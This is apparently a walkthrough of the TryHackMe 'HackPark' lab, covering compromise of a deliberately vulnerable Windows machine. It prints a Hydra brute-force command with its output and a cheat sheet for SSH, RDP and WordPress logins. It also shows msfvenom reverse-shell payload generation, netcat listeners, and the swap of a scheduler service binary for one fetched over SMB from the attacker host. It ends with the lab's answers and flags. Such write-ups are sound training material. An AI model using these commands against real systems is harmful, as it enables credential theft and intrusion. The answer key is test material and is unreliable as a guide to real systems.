# HackPark

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

[HackPark](https://tryhackme.com/room/hackpark)

## Topic's

- Brute Forcing (http-post-form)
- CVE-2019-6714 - BlogEngine.NET 3.3.6
- Directory Traversal
- Windows Enumeration
- Exploiting Scheduler

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy the vulnerable Windows machine

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our [access page](https://tryhackme.com/access). Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

Deploy the machine and access its web server.

`No answer needed`

Whats the name of the clown displayed on the homepage?

`Pennywise`

## Task 2 Using Hydra to brute-force a login

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful [Kali Linux machine](https://tryhackme.com/room/kali) and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here).

What request type is the Windows website login form using?

`POST`

Now we know the **request type** and have a **URL** for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks: `hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form`

Guess a username, choose a password wordlist and gain credentials to a user account!

[http://10.10.197.201/Account/login.aspx?ReturnURL=/admin/](http://10.10.197.201/Account/login.aspx?ReturnURL=/admin/)

```
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.197.201
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.197.201/Account/login.aspx?ReturnURL=/admin/
Content-Type: application/x-www-form-urlencoded
Content-Length: 558
Connection: close
Upgrade-Insecure-Requests: 1

__VIEWSTATE=tp8uWKWyDMBjEE1oI%2FVny6%2BJZN3VgvibMk5E6HPg5soB2dtdzoBJVYlFw9shqyl7S5ugjvNP%2FeJMPg40AbCmjTBktbryEGfzn89qPvEy4hju%2FWm1obJVNOAXeDJ5LyJlWDfreaV8C0Ahzr3j3QVTpG1aeO9Jn0E9SsNltJ52Lik3oyaE&__EVENTVALIDATION=n2BAoWMNSbaY%2BUw5yGP34IvfuWA6R1%2FRcn1pwRS%2BLGnaSDOAdulCi4LXiDENyWqi9LUi4l3rV8kxafa6yWTutZS%2BHlIwYuIn8WKLox%2BvS%2FJzEnJQc2M8HlL6Q%2FMeUTxVDiDC8439S53nXmT3as%2FCO1tx%2Fqu73Ql%2Fy7flfVubqwNFxnu7&ctl00%24MainContent%24LoginUser%24UserName=asd&ctl00%24MainContent%24LoginUser%24Password=asd&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

```
kali@kali:~/CTFs/tryhackme/HackPark$ hydra -v -l admin -P /usr/share/wordlists/rockyou.txt 10.10.197.201 http-post-form "/Account/login.aspx:__VIEWSTATE=tp8uWKWyDMBjEE1oI%2FVny6%2BJZN3VgvibMk5E6HPg5soB2dtdzoBJVYlFw9shqyl7S5ugjvNP%2FeJMPg40AbCmjTBktbryEGfzn89qPvEy4hju%2FWm1obJVNOAXeDJ5LyJlWDfreaV8C0Ahzr3j3QVTpG1aeO9Jn0E9SsNltJ52Lik3oyaE&__EVENTVALIDATION=n2BAoWMNSbaY%2BUw5yGP34IvfuWA6R1%2FRcn1pwRS%2BLGnaSDOAdulCi4LXiDENyWqi9LUi4l3rV8kxafa6yWTutZS%2BHlIwYuIn8WKLox%2BvS%2FJzEnJQc2M8HlL6Q%2FMeUTxVDiDC8439S53nXmT3as%2FCO1tx%2Fqu73Ql%2Fy7flfVubqwNFxnu7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-19 09:23:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.197.201:80/Account/login.aspx:__VIEWSTATE=tp8uWKWyDMBjEE1oI%2FVny6%2BJZN3VgvibMk5E6HPg5soB2dtdzoBJVYlFw9shqyl7S5ugjvNP%2FeJMPg40AbCmjTBktbryEGfzn89qPvEy4hju%2FWm1obJVNOAXeDJ5LyJlWDfreaV8C0Ahzr3j3QVTpG1aeO9Jn0E9SsNltJ52Lik3oyaE&__EVENTVALIDATION=n2BAoWMNSbaY%2BUw5yGP34IvfuWA6R1%2FRcn1pwRS%2BLGnaSDOAdulCi4LXiDENyWqi9LUi4l3rV8kxafa6yWTutZS%2BHlIwYuIn8WKLox%2BvS%2FJzEnJQc2M8HlL6Q%2FMeUTxVDiDC8439S53nXmT3as%2FCO1tx%2Fqu73Ql%2Fy7flfVubqwNFxnu7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.197.201/
[80][http-post-form] host: 10.10.197.201   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.197.201 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-19 09:24:37
```

`1qaz2wsx`

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the **http-post-form** that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.

Below is a mini cheatsheet:

| Command                                                                                                                                      | Description                                                                                                                                                        |
| -------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| hydra -P <wordlist> -v <ip> <protocol>                                                                                                       | Brute force against a protocol of your choice                                                                                                                      |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>                                                                 | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                      | Attack a Windows Remote Desktop with a password list.                                                                                                              |
| hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force.                                                                                                            |

`No answer needed`

## Task 3 Compromise the machine

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com/)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)
undefined

Now you have logged into the website, are you able to identify the version of the BlogEngine?

`3.3.6.0`

Use the [exploit database archive](http://www.exploit-db.com/) to find an exploit to gain a reverse shell on this system.

What is the CVE?

`CVE-2019-6714`

Using the public exploit, gain initial access to the server.

[http://10.10.197.201/admin/app/editor/editpost.cshtml](http://10.10.197.201/admin/app/editor/editpost.cshtml)

Who is the webserver running as?

```
kali@kali:~/CTFs/tryhackme/HackPark$ nc -lnvp 9001
Listening on 0.0.0.0 9001

id
Connection received on 10.10.197.201 49260
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

## Task 4 Windows Privilege Escalation

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.

If you don't know how to do this, I suggest completing the Metasploit room first!

Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!

`No answer needed`

You can run metasploit commands such as **sysinfo** to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

What is the OS version of this windows machine?

```
C:\Program Files (x86)\SystemScheduler>systeminfo
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          11/19/2020, 12:09:07 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,704 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 3,732 MB
Virtual Memory: In Use:    1,772 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
                           [07]: KB3035131
                           [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.197.201
                                 [02]: fe80::4d29:32f9:24d9:c8f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

`Windows 2012 R2 6.3 Build 9600`

Further enumerate the machine. What is the name of the abnormal service running?

`WindowsScheduler`

What is the name of the binary you're supposed to exploit?

```
kali@kali:~/CTFs/tryhackme/HackPark$ msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.106.222 LPORT=9002 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] Skipping invalid encoder /x86/shikata_ga_nai
[!] Couldn't find encoder to use
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe

kali@kali:~/CTFs/tryhackme/HackPark$ sudo smbserver.py smbfolder .
[sudo] password for kali:
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.197.201,49267)
[*] AUTHENTICATE_MESSAGE (\,HACKPARK)
[*] User HACKPARK\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SMBFOLDER)
[*] Closing down connection (10.10.197.201,49267)
[*] Remaining connections []
```

```
kali@kali:~/CTFs/tryhackme/HackPark$ nc -lnvp 9001
Listening on 0.0.0.0 9001

id
Connection received on 10.10.197.201 49260
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>whoami
iis apppool\blog

cd "C:\Program Files (x86)\SystemScheduler"
c:\windows\system32\inetsrv>cd "C:\Program Files (x86)\SystemScheduler"
dir
C:\Program Files (x86)\SystemScheduler>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Program Files (x86)\SystemScheduler
08/04/2019  03:37 AM    <DIR>          .
08/04/2019  03:37 AM    <DIR>          ..
05/17/2007  12:47 PM             1,150 alarmclock.ico
08/31/2003  11:06 AM               766 clock.ico
08/31/2003  11:06 AM            80,856 ding.wav
11/19/2020  01:00 AM    <DIR>          Events
08/04/2019  03:36 AM                60 Forum.url
01/08/2009  07:21 PM         1,637,972 libeay32.dll
11/15/2004  11:16 PM             9,813 License.txt
11/19/2020  12:09 AM             1,496 LogFile.txt
11/19/2020  12:10 AM             3,760 LogfileAdvanced.txt
03/25/2018  09:58 AM           536,992 Message.exe
03/25/2018  09:59 AM           445,344 PlaySound.exe
03/25/2018  09:58 AM            27,040 PlayWAV.exe
08/04/2019  02:05 PM               149 Preferences.ini
03/25/2018  09:58 AM           485,792 Privilege.exe
03/24/2018  11:09 AM            10,100 ReadMe.txt
03/25/2018  09:58 AM           112,544 RunNow.exe
03/25/2018  09:59 AM            40,352 sc32.exe
08/31/2003  11:06 AM               766 schedule.ico
03/25/2018  09:58 AM         1,633,696 Scheduler.exe
03/25/2018  09:59 AM           491,936 SendKeysHelper.exe
03/25/2018  09:58 AM           437,664 ShowXY.exe
03/25/2018  09:58 AM           439,712 ShutdownGUI.exe
03/25/2018  09:58 AM           235,936 SSAdmin.exe
03/25/2018  09:58 AM           731,552 SSCmd.exe
01/08/2009  07:12 PM           355,446 ssleay32.dll
03/25/2018  09:58 AM           456,608 SSMail.exe
08/04/2019  03:36 AM             6,999 unins000.dat
08/04/2019  03:36 AM           722,597 unins000.exe
08/04/2019  03:36 AM                54 Website.url
06/26/2009  04:27 PM             6,574 whiteclock.ico
03/25/2018  09:58 AM            76,704 WhoAmI.exe
05/16/2006  03:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  02:58 PM             2,026 WScheduler.cnt
03/25/2018  09:58 AM           331,168 WScheduler.exe
05/16/2006  03:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  09:58 AM           136,096 WSCtrl.exe
03/25/2018  09:58 AM            98,720 WService.exe
03/25/2018  09:58 AM            68,512 WSLogon.exe
03/25/2018  09:59 AM            33,184 WSProc.dll
              38 File(s)     11,148,259 bytes
               3 Dir(s)  39,121,125,376 bytes free
ren Message.exe Message.exe.bak
C:\Program Files (x86)\SystemScheduler>ren Message.exe Message.exe.bak
copy \\10.8.106.222\smbfolder\Message.exe
C:\Program Files (x86)\SystemScheduler>copy \\10.8.106.222\smbfolder\Message.exe
        1 file(s) copied.
```

`Message.exe`

Using this abnormal service, escalate your privileges! What is the user flag (on Jeffs Desktop)?

```
C:\PROGRA~2\SYSTEM~1>type "c:\Users\jeff\Desktop\user.txt"
type "c:\Users\jeff\Desktop\user.txt"
759bd8af507517bcfaede78a21a73e39
```

`759bd8af507517bcfaede78a21a73e39`

What is the root flag?

```
C:\PROGRA~2\SYSTEM~1>type "c:\Users\Administrator\Desktop\root.txt"
type "c:\Users\Administrator\Desktop\root.txt"
7e13d97f05f7ceb9881a3eb3d78d3e72
```

`7e13d97f05f7ceb9881a3eb3d78d3e72`

## Task 5 Privilege Escalation Without Metasploit

In this task we will escalate our privileges without the use of meterpreter/metasploit!

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.
Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp

`No answer needed`

After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).

Tip: It's common to find C:\Windows\Temp is world writable!

`No answer needed`

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

Tip: You can execute these files by using .\filename.exe

Using winPeas, what was the Original Install time? (This is date and time)

`8/3/2019, 10:43:23 AM`
